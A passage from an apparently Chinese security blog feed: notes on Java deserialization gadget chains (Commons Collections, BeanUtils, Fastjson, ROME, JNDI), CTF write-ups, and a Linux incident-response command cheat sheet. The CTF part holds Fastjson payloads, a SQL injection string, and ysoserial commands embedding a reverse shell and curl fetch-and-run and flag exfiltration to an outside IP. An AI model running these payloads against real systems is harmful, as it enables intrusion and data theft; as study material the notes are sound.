src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830032944049.png" class="" title="image-20240830032944049"><p>但是此时仍然是一个数组，有没有办法跳过ConstantTransformer呢？</p><blockquote><p>TiedMapEntry的构造函数传入一个map和一个key，他的getValue方法调用的了map#get–&gt;transfrom(key)</p></blockquote><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830033417841.png" class="" title="image-20240830033417841"><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200450616.png" class="" title="image-20240831200450616"><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl">P<span class="hljs-function"><span class="hljs-title">riorityQueue</span>--&gt;</span>T<span class="hljs-function"><span class="hljs-title">ransformingComparator</span>#compare--&gt;</span>transfrom<br>PriorityQueue可以调用到java.util.Comparator对象<br></code></pre></td></tr></table></figure><p>在2015年底commons-collections反序列化利⽤链被提出时，Apache Commons Collections有以下两</p><p>个分⽀版本：</p><ul><li>commons-collections:commons-collections</li><li>org.apache.commons:commons-collections4</li></ul><p>commons-collections4</p><ul><li><p>直接CC6的decorate方法改成lazymap（）即可</p></li><li><p>同时还出现了CC2和CC4链子</p></li></ul><p>！！CC2利用了！！</p><ul><li>java.util.PriorityQueue：<strong>存在反序列化入口，可以调用到java.util.Comparator</strong>对象</li><li>org.apache.commons.collections4.comparators**.TransformingComparator存在compare方法**</li><li><strong>compare方法调用了transfrom</strong></li></ul><p>随后</p><ul><li>CC3.2.2增加了序列化检查</li><li>CC4.1直接禁止了部分transfromer类序列化</li></ul><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200512394.png" class="" title="image-20240831200512394"><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200526744.png" class="" title="image-20240831200526744"><h2 id="CB"><a href="#CB" class="headerlink" title="CB"></a>CB</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PriorityQueue—-》org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.beanutils</span>.BeanComparator#compare--》递归调用getter方法--》TemplatesImpl#getOutputProperties<br></code></pre></td></tr></table></figure><blockquote><p>CB库的getProperty会调用相应javaBean的getter方法来获取对应的属性，同时支持递归</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830042046718.png" class="" title="image-20240830042046718"></blockquote><p>我们从CC2中知道，PriorityQueue可以调用到java.util.Comparator对象</p><p>CB中存在org.apache.commons.beanutils.BeanComparator#compare:当比较的参数存在值的时候会通过getProperty寻找属性</p><p>而getProperty会<strong>递归调用getter方法</strong></p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830042515646.png" class="" title="image-20240830042515646"><p>而在<strong>TemplatesImpl中存在getOutputProperties</strong></p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs hsp">重点！！后面很多链子都会去找getter链子然后调用到TemplatesImpl<span class="hljs-meta">#getOutputProperties</span><br>之前的链子都是利用TemplatesImpl<span class="hljs-meta">#newTransformer动态加载字节码以及直接invoke调用<span class="hljs-keyword">Runtime</span></span><br></code></pre></td></tr></table></figure><p>则只需要让o1为TemplatesImpl，property为OutputProperties</p><p>就可以通过getter调用到<strong>TemplatesImpl#getOutputProperties动态加载字节码</strong></p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830042747118.png" class="" title="image-20240830042747118"><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830043216267.png" class="" title="image-20240830043216267"><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200549726.png" class="" title="image-20240831200549726"><h2 id="Shiro-CB"><a href="#Shiro-CB" class="headerlink" title="Shiro-CB"></a>Shiro-CB</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">寻找一个可以替代org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.comparators</span>.ComparableComparator的类<br></code></pre></td></tr></table></figure><ul><li>serialVersionUID不同</li><li>CB缺乏CC依赖（BeanComparator构造函数调用了org.apache.commons.collections.comparators.ComparableComparator）</li></ul><p>问题1：手动设置UID即可</p><p>问题2：通过String.CASE_INSENSITIVE_ORDER获取CaseInsensitiveComparator类，他</p><ul><li>实现 java.util.Comparator 接口</li><li>实现 java.io.Serializable 接口</li><li>Java、shiro或commons-beanutils自带，且兼容性强</li></ul><h2 id="原生链"><a href="#原生链" class="headerlink" title="原生链"></a>原生链</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">HashSet#readObject --&gt; HashSet#put--&gt;动态代理调用AnnotationInvocationHandler#equalsImpl--》TemplateImpl<br>中间需要trick构造HashSet<br></code></pre></td></tr></table></figure><p>7u21</p><p>AnnotationInvocationHandler#equalsImpl调用了所有方法</p><p>这里可以想到<strong>动态字节码</strong></p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830044440538.png" class="" title="image-20240830044440538"><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830044346633.png" class="" title="image-20240830044346633"><p>又根据他的invoke方法，只需要被动态代理的对象被调用equals方法且只有一个参数</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830045043595.png" class="" title="image-20240830045043595"><p>这里涉及到两个方法的区别，java.util.PriorityQueue调用的是compareTo</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830045157340.png" class="" title="image-20240830045157340"><p>为了调用到equals方法，想到了不能让键重复的<strong>集合</strong></p><p>在HashSet#readObject –&gt; HashSet#put中</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830050625387.png" class="" title="image-20240830050625387"><p>其中的key是我们传入的可控的对象，而进入到这一步要求<strong>proxy对象的“哈希”，等于TemplateImpl对象的“哈希”。</strong></p><p>trick</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830051014721.png" class="" title="image-20240830051014721"><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830051429547.png" class="" title="image-20240830051429547"><p>反序列化逻辑如：HashMap中的元素去重，分别是proxy和TemplatesImpl，获取hashcode（）成功触发equals（），调用到代理的equalsImpl，然后遍历this.type的方法也就是TemplatesImpl的方法</p><h2 id="Hessian"><a href="#Hessian" class="headerlink" title="Hessian"></a>Hessian</h2><h2 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h2><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902163221805.png" class="" title="image-20240902163221805"><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>    <span class="hljs-string">&quot;    \&quot;a\&quot;:&#123;\n&quot;</span> +<br>    <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +<br>    <span class="hljs-string">&quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +<br>    <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>    <span class="hljs-string">&quot;    \&quot;b\&quot;:&#123;\n&quot;</span> +<br>    <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +<br>    <span class="hljs-string">&quot;        \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;,\n&quot;</span> +<br>    <span class="hljs-string">&quot;        \&quot;autoCommit\&quot;:true\n&quot;</span> +<br>    <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>    <span class="hljs-string">&quot;&#125;&quot;</span>;<br>JSON.parse(payload);<br></code></pre></td></tr></table></figure><p>a对象缓存绕过，b对象设置autoCommit导致反序列化时设置反射属性</p><p>com.sun.rowset.JdbcRowSetImpl.setAutoCommit() –&gt;com.sun.jndi.rmi.registry.RegistryContext.lookup()</p><ul><li>较低版本JDK(JDNI)</li><li>出网</li></ul><h3 id="TemplateImpl"><a href="#TemplateImpl" class="headerlink" title="TemplateImpl"></a>TemplateImpl</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;a\&quot;:&#123;\n&quot;</span> +<br>    <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +<br>    <span class="hljs-string">&quot;\&quot;val\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;\n&quot;</span> +<br>    <span class="hljs-string">&quot;&#125;,\n&quot;</span> +<br>    <span class="hljs-string">&quot;\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,&quot;</span> +<br>    <span class="hljs-string">&quot;\&quot;_bytecodes\&quot;:[\&quot;!!!Payload!!!\&quot;],\&quot;_name\&quot;:\&quot;a.b\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;</span>;<br>JSON.parse(payload, Feature.SupportNonPublicField);<br></code></pre></td></tr></table></figure><p>构建了一个恶意类，然后base64编码</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902111240803.png" class="" title="image-20240902111240803"><p>需要开启<code>Feature.SupportNonPublicField</code>，实战中不适用</p><h3 id="BasicDataSource"><a href="#BasicDataSource" class="headerlink" title="BasicDataSource"></a>BasicDataSource</h3><p>利用的是BCEL</p><ul><li>不需要出网，不需要开启特殊的参数，适用范围较广</li><li>目标需要引入tomcat依赖，虽说比较常见，但也是一种限制</li></ul><h2 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h2><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">toString</span><span class="hljs-literal">--</span><span class="hljs-comment">》getPropertyDescriptors</span><span class="hljs-literal">--</span><span class="hljs-comment">》Templateslmpl</span><br></code></pre></td></tr></table></figure><p>用于处理XML数据的库</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902160629272.png" class="" title="image-20240902160629272"><h3 id="EqualBeans-ObjectBean"><a href="#EqualBeans-ObjectBean" class="headerlink" title="EqualBeans(ObjectBean)"></a>EqualBeans(ObjectBean)</h3><p><strong>利用hashmap</strong></p><p>hashmap#readObject–&gt;this.map#hashcode（EqualBeans#hashcode）– &gt;EqualBeans#toString</p><h3 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h3><p><strong>绕过hashmap</strong></p><p>HashTable#readObject–&gt;this.key#reconstitutionPut–&gt;this.key#hashcode（EqualBeans#hashcode）– &gt;EqualBeans#toString</p><h3 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h3><p>cc链里面调用到toString的方法</p><h2 id="二次反序列化"><a href="#二次反序列化" class="headerlink" title="二次反序列化"></a>二次反序列化</h2><h3 id="RMIConnector"><a href="#RMIConnector" class="headerlink" title="RMIConnector"></a>RMIConnector</h3><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">InvokerTransform<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">transform</span><span class="hljs-params">()</span></span> -&gt; RMIConnector<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">connect</span><span class="hljs-params">()</span></span> -&gt;&gt; RMIConnector<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">findRMIServerJRMP</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>RMIConnector#findRMIServerJRMP会将参数进行反序列化<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902163728961.png" class="" title="image-20240902163728961"></p><p>找到调用它的函数</p><ul><li>path开头&#x2F;stub</li><li>截取后面的为base64参数传入</li></ul><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902163815258.png" class="" title="image-20240902163815258"><p>最后找到connect</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902163916449.png" class="" title="image-20240902163916449"><h3 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h3><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902164538301.png" class="" title="image-20240902164538301"><h3 id="Jackson"><a href="#Jackson" class="headerlink" title="Jackson"></a>Jackson</h3><p>writeValueAsString是<a href="https://so.csdn.net/so/search?q=jackson&spm=1001.2101.3001.7020">jackson</a>序列化自带的入口，在调用该方法的过程中将会通过遍历的方法将<strong>bean对象中的所有的属性的getter方法进行调用</strong></p><p>而在POJONode父类的父类中中有toString方法，可以触发二次反序列化</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902162927924.png" class="" title="image-20240902162927924"><h1 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h1><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240823165315177.png" class="" title="image-20240823165315177"><p>http协议使用loader类，不以&#x2F;结尾则识别为JAR文件，剩下的都是file协议</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240823165651906.png" class="" title="image-20240823165651906"><p>顺序：</p><ul><li>寻找已加载以及父加载器</li><li>根据url指定方式读取加载字节码</li><li>处理字节码称为类</li></ul><p><strong>defineclass不会触发类初始化，如果想要利用他执行命令需要设法触发构造函数</strong></p><h2 id="加载字节码"><a href="#加载字节码" class="headerlink" title="加载字节码"></a>加载字节码</h2><p>URLclassloader：<strong>远程加载字节码</strong></p><p>ClassLoader#defineClass：<strong>直接加载字节码</strong>，需要触发构造函数</p><p>TemplatesImpl：底层调用了defineClass，字节码必须是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 子类</p><p>BCEL ClassLoader：java8u251之前<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240828164332170.png" class="" title="image-20240828164332170"></p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>基础概念</p><p>reference引用：传入类名，工厂名，工厂位置</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240531104537565.png" class="" title="image-20240531104537565"><p>又由于JNDI可以绑定引用对象，就可以在工厂位置中嵌入恶意代码实现诸注入</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240531104710069.png" class="" title="image-20240531104710069"><p>在本地开一个存在恶意TestRef的服务器<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240531104822161.png" class="" title="image-20240531104822161"></p><p>逻辑：JNDI服务器绑定了恶意远程对象，客户端调用lookup去查找的时候会触发恶意代码</p><p>同时JNDI也可以去打RMI</p><p>高版本的JDK禁止了调用远程服务器，则需要寻找本地可利用的恶意工厂类（tomcat8的beanfactory反射调用EL表达式）</p><h2 id="fastjson反序列化漏洞"><a href="#fastjson反序列化漏洞" class="headerlink" title="fastjson反序列化漏洞"></a>fastjson反序列化漏洞</h2><p>解析json字符串的fastjson库提供了一个将字符串根据@type类型解析为对象的功能</p><p>在处理完字符串之后需要获取类的反序列化器进行反序列化</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240601003801739.png" class="" title="image-20240601003801739"><p>最早的版本存在黑名单，但是只过滤某些有bug的类<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240601004003868.png" class="" title="image-20240601004003868"></p><p>自定义的类之后会来到<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240601004054185.png" class="" title="image-20240601004054185"></p><p>会通过一个beaninfo的build方法获取这个类的信息<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240601004218051.png" class="" title="image-20240601004218051"></p><p>遍历三次，分别获取setter，属性，getter（逻辑大概是既然需要处理一个类，那么就需要得到这个类的属性并且知道怎么将他的属性赋值）</p><p>getter需要满足条件（返回值是特定的类）</p><p>若某个属性只有get没有set，反序列化的时候会通过getOnly属性来让他调用get方法<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240601004441277.png" class="" title="image-20240601004441277"></p><p>这个过程中以后一个asmEnable属性，关闭的时候会调用JavaBeanDeserializer，开启则调用自定义的asmFactory作为反序列化，为了调试代码需要把它关闭掉</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240601010107546.png" class="" title="image-20240601010107546">怎么把它关掉呢？第一次获取setter的时候只允许传入一个参数，则不考虑，第三次获取getter的时候可以利用<p>与普通序列化漏洞的区别<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240604182647623.png" class="" title="image-20240604182647623"></p><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="网鼎杯2020thinkjava"><a href="#网鼎杯2020thinkjava" class="headerlink" title="网鼎杯2020thinkjava"></a>网鼎杯2020thinkjava</h2><p>拿到class文集爱你，放进idea的out目录下反编译</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240829223536069.png" class="" title="image-20240829223536069"><p>跟进一下函数，存在注入</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240829223921069.png" class="" title="image-20240829223921069"><p>此处利用到jdbc注入</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240829224027506.png" class="" title="image-20240829224027506"><ul><li><p>#既是sql注释符，又是url中的锚点，jdbc类似url解析</p></li><li><p>由于#后的字符被忽略，前面的数据正常解析</p></li><li><p>#后的数据带入数据库，单引号闭合后注入</p></li></ul><p>同时发现数据库默认myapp<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240829224529134.png" class="" title="image-20240829224529134"></p><p>这里可以利用swaggerUI</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240829224945197.png" class="" title="image-20240829224945197"><p>于是构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">dbName=myapp#<span class="hljs-string">&#x27; union select group_concat(SCHEMA_NAME)from(information_schema.schemata)#</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>后面都是常规的sql注入 得到用户账密后返回一段cookie，rO0AB开头，怀疑反序列化</p><p>使用bp插件探测java ROME链子</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830000518794.png" class="" title="image-20240830000518794"><p>反弹shell poc</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arcade">bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp/<span class="hljs-number">49.234</span><span class="hljs-number">.59</span><span class="hljs-number">.200</span>/<span class="hljs-number">444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br>base64编码后<br><br>java -jar ysoserial-<span class="hljs-built_in">all</span>.jar ROME <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80OS4yMzQuNTkuMjAwLzQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&gt;a.bin<br><br>或者本地写一个<span class="hljs-number">1.</span>txt 然后<br>java -jar ysoserial-<span class="hljs-built_in">all</span>.jar ROME <span class="hljs-string">&quot;curl http://49.234.59.200/1.txt|bash&quot;</span> &gt; a.bin<br></code></pre></td></tr></table></figure><p>curl和ping外带的poc</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial-all.<span class="hljs-keyword">jar </span>ROME <span class="hljs-string">&quot;curl http://49.234.59.200:666 -d @/flag&quot;</span> &gt; a.<span class="hljs-keyword">bin</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial-all.<span class="hljs-keyword">jar </span>ROME <span class="hljs-string">&quot;ping dji552.dnslog.cn&quot;</span> &gt; a.<span class="hljs-keyword">bin</span><br></code></pre></td></tr></table></figure><h2 id="网鼎杯2020青龙组filejava"><a href="#网鼎杯2020青龙组filejava" class="headerlink" title="网鼎杯2020青龙组filejava"></a>网鼎杯2020青龙组filejava</h2><p>下载路径目录穿越</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830012440699.png" class="" title="image-20240830012440699"><p>&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;web.xml</p><p>然后目录穿越到</p><p>&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;classes下去下载class文件</p><p>后面是一个xml的cve</p><h2 id="CISCN-2023-deserbug"><a href="#CISCN-2023-deserbug" class="headerlink" title="[CISCN 2023]deserbug"></a>[CISCN 2023]deserbug</h2><p>main函数接受bugstr base解码后反序列化</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902094658896.png" class="" title="image-20240902094658896"><p>Myexcept类存在</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902094735083.png" class="" title="image-20240902094735083"><p>联想到CC3</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902094810072.png" class="" title="image-20240902094810072">]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>云安全</title>
    <link href="/2024/12/13/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    <url>/2024/12/13/%E4%BA%91%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="022eb2eb97989772a435d4cadbbe991d3fa0ab36d763077db115f6c02b2e1f3b"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>玄机靶场</title>
    <link href="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    <url>/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="玄机"><a href="#玄机" class="headerlink" title="玄机"></a>玄机</h1><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><code>netstat -pantu</code></p><p>-p 显示相关联的进程</p><p>-a 所有活动的连接,包括监听与被监听</p><p>-n 数字格式的ip端口而非进行域名解析</p><p>-t -u tcp udp</p><p><code>netstat -plntu</code></p><p>-l 只显示监听的连接</p><p><code>netstat -ano[b]</code></p><p>-a all：tcp udp</p><p>-n 数字格式的ip端口而非进行域名解析</p><p>-o 显示pid</p><p>-b 查看可执行程序</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">name</span> <span class="hljs-string">&quot;.*&quot;</span> -mtime -<span class="hljs-number">20</span> 寻找<span class="hljs-number">20</span>天内修改的隐藏文件（mmin也可以）<br><span class="hljs-built_in">find</span> . -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">name</span> <span class="hljs-string">&quot;*.php&quot;</span> -<span class="hljs-built_in">exec</span> grep -Hn <span class="hljs-string">&#x27;eval&#x27;</span> &#123;&#125; \;<br></code></pre></td></tr></table></figure><p>打印出包含”eval”字符串的行及其所在的文件名（-Hn 选项）。{}代表 find 命令找到的文件名，;表示结束-exec 参数。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> access.<span class="hljs-built_in">log</span>.<span class="hljs-number">1</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;/index.php&quot;</span> | wc -<span class="hljs-keyword">l</span><br></code></pre></td></tr></table></figure><p>Wc -l 统计行数</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">cat access.log.1 |<span class="hljs-string"> grep xx&quot; </span>|<span class="hljs-string"> awk &#x27;&#123;print $x&#125;&#x27; </span>|<span class="hljs-string"> sort </span>|<span class="hljs-string"> uniq -c </span>|<span class="hljs-string"> sort -nr </span>|<span class="hljs-string"> head -n 10</span><br></code></pre></td></tr></table></figure><p>head 可以改成 more</p><p>sort 排序后 uniq -c 去除重复并且统计次数，最后 sort -n 按数字-r 降序排序</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">查看进程<br>ps -<span class="hljs-selector-tag">A</span> <br>ps aux<br><span class="hljs-attribute">top</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/GSxkb1iVNo7s3dxL6nkcKAaonYi.png" alt="截图"></p><p><img src="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/H3efbvKvloVa4XxGDHWcNcdAnyb.png" alt="截图"></p><p><img src="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/JDrebv3Vvo1Gz9xyp6jcOMnJnMf.png" alt="截图"></p><p>利用-A -B -C 显示匹配字符串上下文 -rn 查找存在响应字符串的文件</p><p>awk ‘匹配规则 {操作}’ 文件</p><p><img src="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/KzL5bLE0qoJCDoxIYzwcyF5mnQb.png" alt="截图"></p><h2 id="linux-挖矿"><a href="#linux-挖矿" class="headerlink" title="linux-挖矿"></a>linux-挖矿</h2><p>netstat -anplt 发现异常外联</p><p><img src="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/CvxDbdbYoo7e7xxC8xXcx2RSnid.png" alt="截图"></p><p><img src="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/G27ob7ITvoTlMCx6wkfc0X0Unzc.png" alt="截图"></p><h2 id="linux-等保测评"><a href="#linux-等保测评" class="headerlink" title="linux-等保测评"></a>linux-等保测评</h2><p>用户密码过期时间</p><p><img src="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20240706214055854.png" alt="image-20240706214055854"></p><p>密码到期规则</p><p>cat &#x2F;etc&#x2F;login.defs</p><p><img src="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20240706214240539.png" alt="image-20240706214240539"></p><p>SSH版本</p><p><img src="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20240706214431332.png" alt="image-20240706214431332"></p><p>检查passwd文件的权限</p><p><img src="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20240706214956933.png" alt="image-20240706214956933"></p><p><img src="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20240706214759525.png" alt="image-20240706214759525"></p><p><img src="/2024/11/21/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20240706214823372.png" alt="image-20240706214823372"></p><p>也就是 u&#x3D;rwx g&#x3D;r-x  o&#x3D;r-x  